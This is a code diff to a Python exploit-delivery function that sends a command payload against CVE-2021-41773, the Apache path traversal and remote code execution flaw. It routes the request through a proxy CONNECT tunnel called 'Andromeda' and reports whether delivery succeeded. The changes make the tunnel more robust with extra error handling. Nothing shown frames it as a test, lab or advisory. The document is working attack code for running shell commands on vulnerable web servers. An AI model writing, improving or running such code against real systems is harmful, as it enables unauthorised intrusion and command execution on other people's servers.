@@ -23,7 +23,12 @@ def run(payload):
         connection.sendall(f"CONNECT {destination} HTTP/1.1\r\nHost: {destination}\r\n\r\n".encode())
         response = b""
         while b"\r\n\r\n" not in response:
-            response += connection.recv(4096)
+            chunk = connection.recv(4096)
+            if not chunk:
+                raise RuntimeError("Andromeda proxy CONNECT ended before response headers")
+            response += chunk
+            if len(response) > 65536:
+                raise RuntimeError("Andromeda proxy CONNECT response headers too large")
         if not response.startswith(b"HTTP/1.1 200"):
             raise RuntimeError("Andromeda proxy CONNECT failed: " + response.decode(errors="replace"))
         body = b"echo Content-Type: text/plain; echo; " + payload + b"\n"
@@ -39,4 +44,3 @@ def run(payload):
     if " 200 " not in status:
         raise RuntimeError(f"CVE delivery failed: {status}; {raw[-2048:].decode(errors='replace')}")
     return {"delivered": True, "vulnerability_id": "CVE-2021-41773", "http_status": status}
-
